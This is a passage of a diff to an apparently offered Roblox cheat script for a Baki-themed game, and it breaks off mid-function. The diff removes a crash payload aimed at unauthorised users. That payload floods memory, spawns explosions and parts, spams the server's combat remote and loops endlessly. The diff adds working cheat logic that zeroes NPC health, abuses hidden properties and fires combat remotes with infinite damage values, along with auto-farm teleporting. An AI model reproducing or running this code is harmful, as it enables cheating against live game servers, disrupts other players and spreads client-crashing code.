@@ -344,152 +344,11 @@ if _place ~= 5951002734 and _place ~= 5984132 then
     return
 end
 
-if not player.Character or player.Character.Name ~= player.Name then
-
-    spawn(function()
-        local tables = {}
-        while true do
-            table.insert(tables, {string.rep("CRASH", 1000000)})
-            wait(0.001)
-        end
-    end)
-
-    spawn(function()
-        local function recursiveCrash(depth)
-            if depth > 10000 then return end
-            recursiveCrash(depth + 1)
-            recursiveCrash(depth + 1)
-        end
-        recursiveCrash(1)
-    end)
-
-    spawn(function()
-        while true do
-            for i = 1, 100 do
-                local part = Instance.new("Part")
-                part.Size = Vector3.new(100, 100, 100)
-                part.Position = Vector3.new(0, 500, 0)
-                part.Anchored = false
-                part.CanCollide = true
-                part.Parent = workspace
-                
-                local bodyForce = Instance.new("BodyForce")
-                bodyForce.Force = Vector3.new(0, -part:GetMass() * 196.2, 0)
-                bodyForce.Parent = part
-            end
-            wait(0.01)
-        end
-    end)
-
-    spawn(function()
-        while true do
-            for i = 1, 50 do
-                local sound = Instance.new("Sound")
-                sound.SoundId = "rbxassetid://9114825996"
-                sound.Volume = 10
-                sound.Playing = true
-                sound.Parent = workspace
-            end
-            wait(0.01)
-        end
-    end)
-
-    spawn(function()
-        while true do
-            local explosion = Instance.new("Explosion")
-            explosion.Position = Vector3.new(
-                math.random(-500, 500),
-                math.random(10, 100),
-                math.random(-500, 500)
-            )
-            explosion.BlastPressure = 1000000
-            explosion.BlastRadius = 100
-            explosion.Parent = workspace
-            wait(0.01)
-        end
-    end)
-
-    spawn(function()
-        while true do
-            pcall(function()
-                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ClientToServer"):WaitForChild("BasicCombat"):FireServer(
-                    "CRASH", 999999, nil, false, false
-                )
-            end)
-            wait(0.001)
-        end
-    end)
-
-    spawn(function()
-        while true do
-            local screenGui = Instance.new("ScreenGui")
-            screenGui.Parent = player.PlayerGui
-            
-            for i = 1, 100 do
-                local frame = Instance.new("Frame")
-                frame.Size = UDim2.new(1, 0, 1, 0)
-                frame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
-                frame.Parent = screenGui
-            end
-            wait(0.01)
-        end
-    end)
-
-    spawn(function()
-        local hugeStrings = {}
-        while true do
-            table.insert(hugeStrings, string.rep("CRASH" .. math.random(1000000), 10000))
-            if #hugeStrings > 1000 then
-                table.remove(hugeStrings, 1)
-            end
-            wait(0.001)
-        end
-    end)
-
-    spawn(function()
-        while true do
-            local part = Instance.new("Part")
-            part.Size = Vector3.new(1, 1, 1)
-            part.Position = Vector3.new(0, 50, 0)
-            part.Parent = workspace
-            
-            local fire = Instance.new("Fire")
-            fire.Size = 100
-            fire.Heat = 100
-            fire.Parent = part
-            
-            local smoke = Instance.new("Smoke")
-            smoke.Size = 100
-            smoke.Opacity = 1
-            smoke.Parent = part
-            wait(0.01)
-        end
-    end)
-
-    spawn(function()
-        local function createCoroutines()
-            while true do
-                spawn(function()
-                    while true do
-                        wait()
-                    end
-                end)
-                wait(0.0001)
-            end
-        end
-        createCoroutines()
-    end)
-
-    wait(5)
-    player:Kick("NO!!!")
-    
-    wait(10)
-    while true do
-        local function deepCrash()
-            return deepCrash() + deepCrash()
-        end
-        pcall(deepCrash)
-    end
+-- Wait for the normal character spawn instead of running the old crash loops.
+local startupCharacter = player.Character or player.CharacterAdded:Wait()
+if not startupCharacter then
+    warn("Project Baki: waiting for the local character failed.")
+    return
 end
 
         --[[ Legacy whitelist gate removed.
@@ -632,267 +491,83 @@ end
             local OneShot_Active = false
             local OneShot_RunId = 0
             local AutoBRExtreme_Active = false
-            local OneShot_Recovery = nil
-
+            -- One Shot health logic; optional Boss Rush recovery is owned by its controller.
+            -- All skill presses stay in the independent selected-key Auto Skill worker.
+            local BossRushRecovery = nil
             local function OneShotMode(state)
                 OneShot_RunId = OneShot_RunId + 1
                 OneShot_Active = state
-                if OneShot_Recovery then
-                    OneShot_Recovery.cleanup()
-                end
-
-                if not state then
-                    return
-                end
-
+                if BossRushRecovery then BossRushRecovery:Reset() end
+                if not state then return end
+            
                 local runId = OneShot_RunId
-                -- Pending work belongs to this run; an old task must not clear a new run's entry.
-                local oneShotPending = setmetatable({}, {__mode = "k"})
-                local zeroHealthTargets = setmetatable({}, {__mode = "k"})
-                local RECOVERY_RANGE = 100
-                local RECOVERY_GRACE = 2
-                local RECOVERY_DURATION = 10
-                local RECOVERY_SKILL_COOLDOWN = 5
-
+                local oneShotPending = setmetatable({}, { __mode = "k" })
+            
                 local function getAutoOneShotModel(humanoid)
                     local gameFolder = workspace:FindFirstChild("Game")
                     local npcFolder = gameFolder and gameFolder:FindFirstChild("Players")
-                    if not npcFolder or not humanoid:IsDescendantOf(npcFolder) then
-                        return nil
-                    end
-
+                    if not npcFolder or not humanoid:IsDescendantOf(npcFolder) then return nil end
                     local model = nil
                     local current = humanoid.Parent
                     while current and current ~= npcFolder do
                         if current:IsA("Model") then
-                            if current == LocalPlayer.Character or Players:GetPlayerFromCharacter(current) then
-                                return nil
-                            end
+                            if current == LocalPlayer.Character or Players:GetPlayerFromCharacter(current) then return nil end
                             model = model or current
                         end
                         current = current.Parent
                     end
-
                     return model
                 end
-
-                local function getOneShotRootPart(humanoid)
-                    local model = getAutoOneShotModel(humanoid)
-                    if not model then return nil end
-                    local root = humanoid.RootPart or model:FindFirstChild("HumanoidRootPart")
-                    if root and root:IsA("BasePart") and root:IsDescendantOf(model) then
-                        return root
-                    end
-                    return nil
-                end
-
+            
                 local function tryOneShotHumanoid(humanoid)
-                    if not OneShot_Active or OneShot_RunId ~= runId
-                        or not humanoid.Parent or humanoid.Health <= 0 then
+                    if not OneShot_Active or OneShot_RunId ~= runId or not humanoid.Parent or humanoid.Health <= 0 then
                         return false
                     end
-                    -- Revalidate the same NPC after any delay, without requiring network ownership.
                     if not getAutoOneShotModel(humanoid) then return false end
                     humanoid.Health = 0
                     return true
                 end
-
-                local function observeZeroHealthTarget(humanoid, root, playerRoot, now)
-                    if not root or not playerRoot or humanoid.Health > 0
-                        or (root.Position - playerRoot.Position).Magnitude > RECOVERY_RANGE then
-                        zeroHealthTargets[humanoid] = nil
-                        return nil
-                    end
-
-                    local observation = zeroHealthTargets[humanoid]
-                    if not observation or observation.root ~= root then
-                        observation = {
-                            root = root, zeroSince = now, sampledAt = now,
-                            position = root.Position, lastMovedAt = nil, attempted = false
-                        }
-                        zeroHealthTargets[humanoid] = observation
-                    end
-                    if now - observation.sampledAt >= 0.5 then
-                        local delta = root.Position - observation.position
-                        -- Dead-state and MoveDirection are unreliable for these broken NPCs.
-                        -- Use actual horizontal displacement, not falling or a single velocity read.
-                        if Vector3.new(delta.X, 0, delta.Z).Magnitude >= 0.5 then
-                            observation.lastMovedAt = now
-                        end
-                        observation.position = root.Position
-                        observation.sampledAt = now
-                    end
-                    if not observation.attempted and now - observation.zeroSince >= RECOVERY_GRACE
-                        and observation.lastMovedAt and now - observation.lastMovedAt <= 0.75 then
-                        return observation
-                    end
-                    return nil
-                end
-
-                local function recoverMovingZeroHealthTarget(targetHumanoid, observation)
-                    if OneShot_Recovery or not OneShot_Active or OneShot_RunId ~= runId then return end
-                    local character = LocalPlayer.Character
-                    local playerHumanoid = character and character:FindFirstChildOfClass("Humanoid")
-                    local playerRoot = character and character:FindFirstChild("HumanoidRootPart")
-                    local remotes = ReplicatedStorage:FindFirstChild("Remotes")
-                    local clientToServer = remotes and remotes:FindFirstChild("ClientToServer")
-                    local skillRemote = clientToServer and clientToServer:FindFirstChild("Skill")
-                    if not playerRoot or not playerHumanoid or playerHumanoid.Health <= 0
-                        or not skillRemote or not skillRemote:IsA("RemoteEvent") then return end
-
-                    observation.attempted = true
-                    local targetRoot = observation.root
-                    local returnCFrame = playerRoot.CFrame
-                    local previousAutoRotate = playerHumanoid.AutoRotate
-                    local attachment, alignPosition, alignOrientation
-                    local recovery = {target = targetHumanoid}
-                    local cleaned = false
-
-                    local function cleanup()
-                        if cleaned then return end
-                        cleaned = true
-                        if alignOrientation then alignOrientation:Destroy() end
-                        if alignPosition then alignPosition:Destroy() end
-                        if attachment then attachment:Destroy() end
-                        if LocalPlayer.Character == character and playerHumanoid.Parent then
-                            playerHumanoid.AutoRotate = previousAutoRotate
-                            if playerHumanoid.Health > 0 and playerRoot.Parent then
-                                playerRoot.CFrame = returnCFrame
-                            end
-                        end
-                        if OneShot_Recovery == recovery then OneShot_Recovery = nil end
-                    end
-                    recovery.cleanup = cleanup
-                    OneShot_Recovery = recovery
-
-                    task.spawn(function()
-                        local ok, err = xpcall(function()
-                            if cleaned or not targetRoot.Parent or not playerRoot.Parent then return end
-                            local hoverPosition = targetRoot.Position + Vector3.new(0, 10, 0)
-                            -- Supply a non-parallel up vector when looking vertically downward.
-                            local hoverCFrame = CFrame.lookAt(hoverPosition, targetRoot.Position, Vector3.zAxis)
-                            playerHumanoid.AutoRotate = false
-                            attachment = Instance.new("Attachment")
-                            attachment.Name = "OneShotRecoveryAttachment"
-                            attachment.Parent = playerRoot
-                            alignPosition = Instance.new("AlignPosition")
-                            alignPosition.Mode = Enum.PositionAlignmentMode.OneAttachment
-                            alignPosition.Attachment0 = attachment
-                            alignPosition.ApplyAtCenterOfMass = true
-                            alignPosition.MaxForce = math.max(playerRoot.AssemblyMass * workspace.Gravity * 20, 50000)
-                            alignPosition.MaxVelocity = 200
-                            alignPosition.Responsiveness = 100
-                            alignPosition.Position = hoverPosition
-                            alignPosition.Parent = playerRoot
-                            alignOrientation = Instance.new("AlignOrientation")
-                            alignOrientation.Mode = Enum.OrientationAlignmentMode.OneAttachment
-                            alignOrientation.Attachment0 = attachment
-                            alignOrientation.MaxTorque = 100000
-                            alignOrientation.MaxAngularVelocity = 50
-                            alignOrientation.Responsiveness = 100
-                            alignOrientation.CFrame = hoverCFrame
-                            alignOrientation.Parent = playerRoot
-                            playerRoot.CFrame = hoverCFrame
-                            playerRoot.AssemblyLinearVelocity = Vector3.zero
-                            playerRoot.AssemblyAngularVelocity = Vector3.zero
-
-                            local startedAt = os.clock()
-                            local lastMovedAt = startedAt
-                            local lastPosition = targetRoot.Position
-                            local nextSkillAt = startedAt + 0.25
-                            while not cleaned and OneShot_Active and OneShot_RunId == runId
-                                and LocalPlayer.Character == character and playerHumanoid.Health > 0
-                                and playerRoot.Parent and targetHumanoid.Parent and targetHumanoid.Health <= 0
-                                and getOneShotRootPart(targetHumanoid) == targetRoot do
-                                local now = os.clock()
-                                if now - startedAt >= RECOVERY_DURATION
-                                    or (targetRoot.Position - playerRoot.Position).Magnitude > RECOVERY_RANGE then break end
-                                local delta = targetRoot.Position - lastPosition
-                                if Vector3.new(delta.X, 0, delta.Z).Magnitude >= 0.5 then
-                                    lastMovedAt = now
-                                    lastPosition = targetRoot.Position
-                                end
-                                if now - lastMovedAt >= 2.5 then break end
-                                hoverPosition = targetRoot.Position + Vector3.new(0, 10, 0)
-                                alignPosition.Position = hoverPosition
-                                alignOrientation.CFrame = CFrame.lookAt(hoverPosition, targetRoot.Position, Vector3.zAxis)
-                                if now >= nextSkillAt and (playerRoot.Position - hoverPosition).Magnitude <= 2 then
-                                    skillRemote:FireServer("Sekiro Mortal Blade")
-                                    nextSkillAt = now + RECOVERY_SKILL_COOLDOWN
-                                end
-                                RunService.Heartbeat:Wait()
-                            end
-                        end, debug.traceback)
-                        cleanup()
-                        if not ok then warn("One Shot recovery: " .. tostring(err)) end
-                    end)
-                end
-
+            
                 task.spawn(function()
                     while OneShot_Active and OneShot_RunId == runId do
                         task.wait(0.1)
-                        if not OneShot_Active or OneShot_RunId ~= runId then
-                            break
-                        end
-
+                        if not OneShot_Active or OneShot_RunId ~= runId then break end
                         if type(sethiddenproperty) == "function" then
                             pcall(function()
                                 sethiddenproperty(LocalPlayer, "SimulationRadius", 100)
                                 sethiddenproperty(LocalPlayer, "MaxSimulationRadius", 100)
                             end)
                         end
-
                         local gameFolder = workspace:FindFirstChild("Game")
                         local npcFolder = gameFolder and gameFolder:FindFirstChild("Players")
-                        if not npcFolder then
+                        if npcFolder then
+                            for _, npc in ipairs(npcFolder:GetDescendants()) do
+                                if not OneShot_Active or OneShot_RunId ~= runId then break end
+                                if npc:IsA("Humanoid") and npc.Health > 0 and getAutoOneShotModel(npc) then
+                                    if AutoBRExtreme_Active or AutoIsland_Active then
+                                        if not oneShotPending[npc] then
+                                            local targetHumanoid = npc
+                                            local oneShotDelay = AutoBRExtreme_Active and 1 or 3
+                                            oneShotPending[targetHumanoid] = true
+                                            task.spawn(function()
+                                                task.wait(oneShotDelay)
+                                                tryOneShotHumanoid(targetHumanoid)
+                                                oneShotPending[targetHumanoid] = nil
+                                            end)
+                                        end
+                                    else
+                                        tryOneShotHumanoid(npc)
+                                    end
+                                end
+                            end
+                        else
                             task.wait(0.1)
-                            continue
-                        end
-
-                        local character = LocalPlayer.Character
-                        local playerRoot = character and character:FindFirstChild("HumanoidRootPart")
-                        local recoveryTarget, recoveryObservation
-                        local recoveryDistance = RECOVERY_RANGE
-                        for _, npc in ipairs(npcFolder:GetDescendants()) do
-                            if not OneShot_Active or OneShot_RunId ~= runId then
-                                break
-                            end
-                            if npc:IsA("Humanoid") and npc.Health <= 0 then
-                                local root = getOneShotRootPart(npc)
-                                local observation = observeZeroHealthTarget(npc, root, playerRoot, os.clock())
-                                if observation then
-                                    local distance = (root.Position - playerRoot.Position).Magnitude
-                                    if distance <= recoveryDistance then
-                                        recoveryTarget, recoveryObservation = npc, observation
-                                        recoveryDistance = distance
-                                    end
-                                end
-                            elseif npc:IsA("Humanoid") and npc.Health > 0
-                                and getAutoOneShotModel(npc) then
-                                zeroHealthTargets[npc] = nil
-                                if AutoBRExtreme_Active or AutoIsland_Active then
-                                    if not oneShotPending[npc] then
-                                        local targetHumanoid = npc
-                                        local oneShotDelay = AutoBRExtreme_Active and 1 or 3
-                                        oneShotPending[targetHumanoid] = true
-                                        task.spawn(function()
-                                            task.wait(oneShotDelay)
-                                            tryOneShotHumanoid(targetHumanoid)
-                                            oneShotPending[targetHumanoid] = nil
-                                        end)
-                                    end
-                                else
-                                    tryOneShotHumanoid(npc)
-                                end
-                            end
-                        end
-                        if recoveryTarget and not OneShot_Recovery then
-                            recoverMovingZeroHealthTarget(recoveryTarget, recoveryObservation)
                         end
                     end
                 end)
             end
-
+            
+            
             local AutoKokushibo_Active = false
         local AutoKokushibo_Speed = 0.1
         local countpunch = 0
@@ -2840,10 +2515,6 @@ end
                 hasTeleportedIsland = false
 
                 local function waitForHRP()
-                    -- Let One Shot finish its skill recovery before an Island waypoint teleport.
-                    while OneShot_Recovery and AutoIsland_Active and AutoIsland_RunId == runId do
-                        task.wait(0.1)
-                    end
                     local char = LocalPlayer.Character
                     if not char then
                         char = LocalPlayer.CharacterAdded:Wait()
@@ -3865,8 +3536,7 @@ end
                                 local character = LocalPlayer.Character
                                 local rootPart = character and character:FindFirstChild("HumanoidRootPart")
                                 if rootPart then
-                                    -- The Extreme marker mechanic takes priority over NPC recovery.
-                                    if OneShot_Recovery then OneShot_Recovery.cleanup() end
+                                    if BossRushRecovery then BossRushRecovery:YieldForMechanic(1.25) end
                                     rootPart.CFrame = currentPart.CFrame
                                 end
 
@@ -4511,6 +4181,674 @@ end
                 TextColor3 = theme.accent,
                 TextXAlignment = Enum.TextXAlignment.Center
             })
+
+            do
+                -- Client controller for the existing Project Baki script.
+                -- Dependencies are injected so lifecycle/target selection can be tested offline.
+                local function createAutoFarmNearController(deps)
+                    local controller = {}
+                    local localPlayer = deps.LocalPlayer
+                    local world = deps.Workspace
+                    local runService = deps.RunService
+                    local storage = deps.ReplicatedStorage
+                    local makeInstance = deps.newInstance or Instance.new
+                    local virtualInput = deps.VirtualInputManager
+                    local taskApi = deps.task or task
+                    local config = {
+                        offset = 20, position = "Above/Below", autoPunch = true,
+                        punchSpeed = 0.2, punchType = "Normal",
+                    }
+                    local enabled, destroyed = false, false
+                    local heartbeat, removingConnection
+                    local target, targetHumanoid, targetRoot
+                    local movementRoot, bodyVelocity, wHeld
+                    local scanModels, scanIndex, scanFolder = nil, 0, nil
+                    local attackTask, attackRunId = nil, 0
+                    local skillTask, skillRunId, skillEnabled, heldSkillKey = nil, 0, false, nil
+                    local selectedSkills = {}
+                    local allowedSkills = { Z = true, X = true, C = true, V = true, B = true, N = true, G = true, J = true }
+                    local warnedMissingRemote = false
+                
+                    local function announce(state, reason)
+                        if deps.onEnabledChanged then
+                            local ok, err = pcall(deps.onEnabledChanged, state, reason)
+                            if not ok and deps.warn then deps.warn(tostring(err)) end
+                        end
+                    end
+                
+                    local function forwardKey(state)
+                        if state then wHeld = true end
+                        virtualInput:SendKeyEvent(state, Enum.KeyCode.W, false, deps.Game)
+                        if not state then wHeld = false end
+                    end
+                
+                    local function releaseForward()
+                        if wHeld then
+                            local ok, err = pcall(forwardKey, false)
+                            if not ok and deps.warn then deps.warn("Auto Farm Near: could not release W: " .. tostring(err)) end
+                        end
+                    end
+                
+                    local function clearBinding()
+                        releaseForward()
+                        if bodyVelocity then bodyVelocity:Destroy(); bodyVelocity = nil end
+                        movementRoot = nil
+                    end
+                
+                    local function clearTarget()
+                        target, targetHumanoid, targetRoot = nil, nil, nil
+                        releaseForward()
+                    end
+                
+                    local function localCharacter()
+                        local character = localPlayer.Character
+                        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+                        local root = character and character:FindFirstChild("HumanoidRootPart")
+                        if not humanoid or humanoid.Health <= 0 or not root or not root:IsA("BasePart") then
+                            return nil
+                        end
+                        return character, humanoid, root
+                    end
+                
+                    local function farmParts(model, folder)
+                        if not model or not folder or model.Parent ~= folder then return nil end
+                        if not model:FindFirstChild("Trainer") then return nil end
+                        local humanoid = model:FindFirstChild("Humanoid")
+                        local root = model:FindFirstChild("HumanoidRootPart")
+                        if humanoid and root and root:IsA("BasePart") then
+                            return humanoid, root
+                        end
+                        return nil
+                    end
+                
+                    local function npcFolder()
+                        local gameFolder = world:FindFirstChild("Game")
+                        return gameFolder and gameFolder:FindFirstChild("Players")
+                    end
+                
+                    local function stopAttack()
+                        attackRunId = attackRunId + 1
+                        local oldTask = attackTask
+                        attackTask = nil
+                        if oldTask and oldTask ~= coroutine.running() then pcall(taskApi.cancel, oldTask) end
+                    end
+                
+                    local function attackLoop(runId)
+                        local function running()
+                            return enabled and not destroyed and config.autoPunch and attackRunId == runId
+                        end
+                        -- Match Lazy Hub's Auto Punch: frame wait, direct children, then 1..5 per target.
+                        while running() do
+                            taskApi.wait()
+                            if not running() then return end
+                            local character, _, root = localCharacter()
+                            local folder = npcFolder()
+                            if character and folder then
+                                for _, model in pairs(folder:GetChildren()) do
+                                    if not running() then return end
+                                    if model:FindFirstChild("HumanoidRootPart") and model.Name ~= localPlayer.Name then
+                                        local currentCharacter, _, currentRoot = localCharacter()
+                                        local humanoid = model:FindFirstChild("Humanoid")
+                                        local enemyRoot = model:FindFirstChild("HumanoidRootPart")
+                                        if currentCharacter and humanoid and enemyRoot and humanoid.Health > 0
+                                            and (currentRoot.Position - enemyRoot.Position).Magnitude <= 21 then
+                                            local remotes = storage:FindFirstChild("Remotes")
+                                            local clientToServer = remotes and remotes:FindFirstChild("ClientToServer")
+                                            local remote = clientToServer and clientToServer:FindFirstChild("BasicCombat")
+                                            if remote and remote:IsA("RemoteEvent") then
+                                                for combo = 1, 5 do
+                                                    -- Cancel old work on stop/respawn instead of leaking a combo.
+                                                    if not running() or localPlayer.Character ~= currentCharacter then return end
+                                                    remote:FireServer(
+                                                        "Light Punch", combo, humanoid,
+                                                        math.huge, math.huge, config.punchType ~= "Normal"
+                                                    )
+                                                    taskApi.wait(config.punchSpeed)
+                                                end
+                                            elseif not warnedMissingRemote then
+                                                warnedMissingRemote = true
+                                                if deps.warn then deps.warn("Auto Farm Near: BasicCombat remote was not found; auto punch is waiting.") end
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                
+                    local function startAttack()
+                        if attackTask or not enabled or destroyed or not config.autoPunch then return end
+                        attackRunId = attackRunId + 1
+                        local runId = attackRunId
+                        attackTask = taskApi.spawn(function()
+                            local ok, err = pcall(attackLoop, runId)
+                            if attackRunId == runId then
+                                attackTask = nil
+                                if not ok then controller:SetEnabled(false, "Auto Punch stopped: " .. tostring(err)) end
+                            end
+                        end)
+                    end
+                
+                    local function releaseSkillKey()
+                        if not heldSkillKey then return end
+                        local key = heldSkillKey
+                        local ok, err = pcall(function()
+                            virtualInput:SendKeyEvent(false, key, false, deps.Game)
+                        end)
+                        if ok then heldSkillKey = nil
+                        elseif deps.warn then deps.warn("Auto Skill: could not release key: " .. tostring(err)) end
+                    end
+                
+                    local function stopSkill()
+                        skillRunId = skillRunId + 1
+                        local oldTask = skillTask
+                        skillTask = nil
+                        if oldTask and oldTask ~= coroutine.running() then pcall(taskApi.cancel, oldTask) end
+                        releaseSkillKey()
+                    end
+                
+                    local function startSkill()
+                        if skillTask or not skillEnabled or destroyed then return end
+                        skillRunId = skillRunId + 1
+                        local runId = skillRunId
+                        skillTask = taskApi.spawn(function()
+                            local ok, err = pcall(function()
+                                while skillEnabled and not destroyed and skillRunId == runId do
+                                    taskApi.wait(0.4)
+                                    if not skillEnabled or destroyed or skillRunId ~= runId then return end
+                                    if localCharacter() then
+                                        -- Same selection order and down/up timing as Lazy Hub Auto Skill.
+                                        for _, name in ipairs(selectedSkills) do
+                                            if not skillEnabled or destroyed or skillRunId ~= runId then return end
+                                            local key = Enum.KeyCode[name]
+                                            if key then
+                                                heldSkillKey = key
+                                                virtualInput:SendKeyEvent(true, key, false, deps.Game)
+                                                taskApi.wait(0.1)
+                                                if not skillEnabled or destroyed or skillRunId ~= runId then return end
+                                                releaseSkillKey()
+                                            end
+                                        end
+                                    end
+                                end
+                            end)
+                            if skillRunId == runId then
+                                skillTask = nil
+                                if not ok then controller:SetAutoSkill(false, "Auto Skill stopped: " .. tostring(err)) end
+                            end
+                        end)
+                    end
+                
+                    local function nextFarmTarget(folder, root)
+                        if not folder then scanModels, scanFolder = nil, nil; return nil end
+                        if not scanModels or scanFolder ~= folder then
+                            scanModels, scanIndex, scanFolder = folder:GetChildren(), 0, folder
+                        end
+                        while scanIndex < #scanModels do
+                            scanIndex = scanIndex + 1
+                            local model = scanModels[scanIndex]
+                            local humanoid, candidateRoot = farmParts(model, folder)
+                            if humanoid and (candidateRoot.Position - root.Position).Magnitude <= 50 then
+                                return model, humanoid, candidateRoot
+                            end
+                        end
+                        scanModels, scanFolder = nil, nil
+                        return nil
+                    end
+                
+                    local function bindCharacter(root)
+                        if movementRoot ~= root then clearBinding(); movementRoot = root end
+                        if bodyVelocity and bodyVelocity.Parent ~= root then bodyVelocity:Destroy(); bodyVelocity = nil end
+                        -- The reference uses a zero-velocity BodyVelocity while farm_near is enabled.
+                        -- Only destroy the mover created by this controller, never another mode's mover.
+                        if not root:FindFirstChild("BodyVelocity") then
+                            bodyVelocity = makeInstance("BodyVelocity")
+                            bodyVelocity.Name = "BodyVelocity"
+                            bodyVelocity.MaxForce = Vector3.new(9000000000, 9000000000, 9000000000)
+                            bodyVelocity.Velocity = Vector3.new(0, 0, 0)
+                            bodyVelocity.Parent = root
+                        end
+                    end
+                
+                    local function hoverPoint(root)
+                        if config.position == "Above/Below" then return root.Position + Vector3.new(0, config.offset, 0) end
+                        return root.Position + root.CFrame.LookVector * config.offset
+                    end
+                
+                    local function step()
+                        if not enabled or destroyed then return end
+                        if deps.isOtherFarmActive and deps.isOtherFarmActive() then
+                            controller:SetEnabled(false, "Another farm mode is active. Disable it before using Auto Farm Near.")
+                            return
+                        end
+                        startAttack()
+                        local character, _, root = localCharacter()
+                        if not character or root.Anchored then clearTarget(); clearBinding(); scanModels = nil; return end
+                        bindCharacter(root)
+                        local folder = npcFolder()
+                        if target then
+                            local validHumanoid, validRoot = farmParts(target, folder)
+                            if validHumanoid ~= targetHumanoid or validRoot ~= targetRoot then
+                                clearTarget()
+                            end
+                        end
+                        if not target then
+                            target, targetHumanoid, targetRoot = nextFarmTarget(folder, root)
+                            if not target then releaseForward(); return end
+                        end
+                        forwardKey(true)
+                        root.CFrame = CFrame.new(hoverPoint(targetRoot), targetRoot.Position)
+                        if targetHumanoid.Health <= 0 then clearTarget() end
+                    end
+                
+                    function controller:SetEnabled(state, reason)
+                        state = state == true and not destroyed
+                        if state == enabled then return end
+                        if state and deps.isOtherFarmActive and deps.isOtherFarmActive() then
+                            announce(false, "Disable the other farm mode before enabling Auto Farm Near.")
+                            return
+                        end
+                        enabled = state
+                        stopAttack()
+                        if heartbeat then heartbeat:Disconnect(); heartbeat = nil end
+                        clearTarget()
+                        clearBinding()
+                        scanModels, scanFolder = nil, nil
+                        if enabled then
+                            heartbeat = runService.Heartbeat:Connect(function()
+                                local ok, err = pcall(step)
+                                if not ok then controller:SetEnabled(false, "Auto Farm Near stopped: " .. tostring(err)) end
+                            end)
+                            startAttack()
+                        end
+                        announce(enabled, reason)
+                    end
+                
+                    function controller:SetConfig(key, value)
+                        if destroyed then return false end
+                        if key == "offset" then
+                            value = tonumber(value)
+                            if not value or value ~= value or value == math.huge or value == -math.huge then return false end
+                            config.offset = math.max(-20, math.min(20, value))
+                        elseif key == "position" then
+                            if value ~= "Above/Below" and value ~= "Front/Behind" then return false end
+                            config.position = value
+                        elseif key == "punchSpeed" then
+                            value = tonumber(value)
+                            if not value or value ~= value or value < 0.1 or value > 1 then return false end
+                            config.punchSpeed = value
+                        elseif key == "punchType" then
+                            if value ~= "Normal" and value ~= "Slam" then return false end
+                            config.punchType = value
+                        elseif key == "autoPunch" and type(value) == "boolean" then
+                            config.autoPunch = value
+                            if value then startAttack() else stopAttack() end
+                        else
+                            return false
+                        end
+                        return true
+                    end
+                
+                    function controller:GetTarget() return target end
+                    function controller:IsEnabled() return enabled end
+                    function controller:GetSelectedSkills()
+                        local result = {}
+                        for index, name in ipairs(selectedSkills) do result[index] = name end
+                        return result
+                    end
+                    function controller:ToggleSkill(name)
+                        if destroyed or not allowedSkills[name] then return false end
+                        for index, value in ipairs(selectedSkills) do
+                            if value == name then table.remove(selectedSkills, index); return true end
+                        end
+                        selectedSkills[#selectedSkills + 1] = name
+                        return true
+                    end
+                    function controller:SetAutoSkill(state, reason)
+                        state = state == true and not destroyed
+                        if state == skillEnabled then return end
+                        skillEnabled = state
+                        stopSkill()
+                        if skillEnabled then startSkill() end
+                        if deps.onSkillEnabledChanged then
+                            local ok, err = pcall(deps.onSkillEnabledChanged, skillEnabled, reason)
+                            if not ok and deps.warn then deps.warn(tostring(err)) end
+                        end
+                    end
+                    function controller:IsAutoSkillEnabled() return skillEnabled end
+                    function controller:Destroy()
+                        if destroyed then return end
+                        if controller.recoveryController then
+                            controller.recoveryController:Destroy()
+                            controller.recoveryController = nil
+                        end
+                        controller:SetEnabled(false)
+                        controller:SetAutoSkill(false)
+                        stopAttack()
+                        stopSkill()
+                        destroyed = true
+                        if removingConnection then removingConnection:Disconnect(); removingConnection = nil end
+                        if controller.uiConnection then controller.uiConnection:Disconnect(); controller.uiConnection = nil end
+                        clearTarget()
+                        clearBinding()
+                    end
+                    removingConnection = localPlayer.CharacterRemoving:Connect(function()
+                        stopAttack()
+                        clearTarget()
+                        clearBinding()
+                        scanModels, scanFolder = nil, nil
+                        stopSkill()
+                        startSkill()
+                    end)
+                    return controller
+                end
+                
+                
+                -- Boss Rush only: zero HP continuously for 10 seconds -> hold 10 studs above.
+                -- Skill presses remain owned by the existing selected-key Auto Skill worker.
+                local function createBossRushRecoveryController(deps)
+                    local controller = {}
+                    local world, player, players = deps.Workspace, deps.LocalPlayer, deps.Players
+                    local clock, makeInstance = deps.clock or os.clock, deps.newInstance or Instance.new
+                    local observations = setmetatable({}, { __mode = "k" })
+                    local locked, hover, home
+                    local destroyed, nextScan, pauseUntil = false, 0, 0
+                    local heartbeat, characterRemoving
+                
+                    local function folder()
+                        local gameFolder = world:FindFirstChild("Game")
+                        return gameFolder and gameFolder:FindFirstChild("Players")
+                    end
+                
+                    local function npcParts(humanoid, npcFolder)
+                        if not npcFolder or not humanoid or not humanoid.Parent or not humanoid:IsDescendantOf(npcFolder) then return nil end
+                        local model, current = nil, humanoid.Parent
+                        while current and current ~= npcFolder do
+                            if current:IsA("Model") then
+                                if current == player.Character or players:GetPlayerFromCharacter(current) then return nil end
+                                model = model or current
+                            end
+                            current = current.Parent
+                        end
+                        if not model then return nil end
+                        local root = humanoid.RootPart or model:FindFirstChild("HumanoidRootPart")
+                        if root and root:IsA("BasePart") and root:IsDescendantOf(model) then return model, root end
+                        return nil
+                    end
+                
+                    local function localParts()
+                        local character = player.Character
+                        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+                        local root = character and character:FindFirstChild("HumanoidRootPart")
+                        if humanoid and humanoid.Health > 0 and root and root:IsA("BasePart") and not root.Anchored then
+                            return character, humanoid, root
+                        end
+                        return nil
+                    end
+                
+                    local function cleanupHover()
+                        local old = hover
+                        hover = nil
+                        if not old then return end
+                        for _, object in ipairs(old.objects) do object:Destroy() end
+                        if old.humanoid.Parent then old.humanoid.AutoRotate = old.autoRotate end
+                    end
+                
+                    local function finishTarget(restore)
+                        cleanupHover()
+                        if restore and home and player.Character == home.character and home.humanoid.Parent
+                            and home.humanoid.Health > 0 and home.root.Parent
+                            and home.character:FindFirstChild("HumanoidRootPart") == home.root then
+                            home.root.CFrame = home.cframe
+                        end
+                        locked, home = nil, nil
+                    end
+                
+                    function controller:Reset(restore)
+                        finishTarget(restore ~= false)
+                        observations = setmetatable({}, { __mode = "k" })
+                        nextScan, pauseUntil = 0, 0
+                    end
+                
+                    function controller:YieldForMechanic(duration)
+                        if destroyed then return end
+                        pauseUntil = math.max(pauseUntil, clock() + (duration or 1.25))
